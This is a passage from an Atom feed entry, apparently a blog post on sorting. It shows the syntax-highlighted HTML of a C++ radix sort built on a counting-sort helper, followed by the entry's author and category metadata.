style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> d </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">extract_digit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> place</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">d</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> BASE</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">--</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> d </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">extract_digit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> place</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        tmp</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">d</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">d</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">--</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">swap</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">tmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">RadixSort</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> element_max_width </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tmp</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> place </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> place </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> element_max_width</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">place</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">CountingSort</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> tmp</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> place</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<hr>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="排序" term="排序"/>
    </entry>
</feed>